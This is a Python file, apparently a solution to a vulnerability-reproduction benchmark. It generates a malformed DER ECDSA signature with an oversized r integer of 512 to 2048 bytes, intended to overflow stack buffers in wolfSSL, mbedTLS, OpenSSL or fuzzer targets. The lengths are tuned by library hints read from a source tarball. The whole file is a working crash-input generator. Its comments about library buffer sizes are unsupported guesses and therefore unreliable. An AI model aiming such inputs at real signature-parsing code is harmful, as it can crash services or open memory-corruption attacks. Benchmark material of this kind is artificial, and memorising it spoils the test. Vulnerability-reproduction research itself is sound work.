import os
import tarfile
import re


class Solution:
    def _encode_asn1_length(self, length: int) -> bytes:
        if length < 0x80:
            return bytes([length])
        # Encode in big-endian with minimum number of bytes
        length_bytes = []
        v = length
        while v > 0:
            length_bytes.append(v & 0xFF)
            v >>= 8
        length_bytes.reverse()
        return bytes([0x80 | len(length_bytes)]) + bytes(length_bytes)

    def _build_integer(self, data_len: int, fill_byte: int = 0x01) -> bytes:
        # Ensure positive INTEGER (first byte < 0x80)
        if fill_byte & 0x80:
            fill_byte = 0x01
        data = bytes([fill_byte]) * data_len
        return bytes([0x02]) + self._encode_asn1_length(len(data)) + data

    def _build_ecdsa_der_signature(self, r_len: int, s_len: int) -> bytes:
        r_part = self._build_integer(r_len, 0x01)
        s_part = self._build_integer(s_len, 0x01)
        seq_content = r_part + s_part
        return bytes([0x30]) + self._encode_asn1_length(len(seq_content)) + seq_content

    def _detect_project_hint(self, src_path: str) -> str:
        # Try to detect library hints to tune PoC size heuristics
        hints = []
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith('.c') or name.endswith('.h') or name.endswith('.cc') or name.endswith('.cpp') or name.endswith('.txt') or name.endswith('.md')):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(4096)
                        text = data.decode('utf-8', errors='ignore').lower()
                        if 'ecdsa' in text:
                            hints.append('ecdsa')
                        if 'asn.1' in text or 'asn1' in text:
                            hints.append('asn1')
                        if 'mbedtls' in text:
                            hints.append('mbedtls')
                        if 'wolfssl' in text or 'wolfcrypt' in text:
                            hints.append('wolfssl')
                        if 'openssl' in text or 'ecdsa_sig' in text or 'd2i_ecdsa' in text:
                            hints.append('openssl')
                        if re.search(r'llvmfuzzertestoneinput', text):
                            hints.append('fuzzer')
                    except Exception:
                        continue
        except Exception:
            pass
        return ','.join(sorted(set(hints)))

    def solve(self, src_path: str) -> bytes:
        # Heuristics: choose an integer length likely to overflow a typical 32/48-byte stack buffer
        # while keeping the PoC compact. Adjust based on detected project hints.
        hint = self._detect_project_hint(src_path)

        # Default lengths
        r_len = 1024  # robust overflow trigger for many implementations
        s_len = 1

        # Tune based on hints
        if 'wolfssl' in hint:
            # wolfSSL ECC stack buffers are small (e.g., 32/48); 512 is sufficient
            r_len = 512
        elif 'mbedtls' in hint:
            # mbedTLS older bugs often exhibit on larger inputs; keep 1024
            r_len = 1024
        elif 'openssl' in hint:
            # OpenSSL typically safer; use larger to increase chance
            r_len = 2048
        elif 'ecdsa' in hint and 'asn1' in hint:
            # Generic ASN.1 ECDSA parsing
            r_len = 1024
        elif 'fuzzer' in hint:
            # Fuzzer targets often expect large edge-case inputs
            r_len = 2048

        # Build DER-encoded ECDSA signature with oversized r to induce stack overflow
        poc = self._build_ecdsa_der_signature(r_len=r_len, s_len=s_len)
        return poc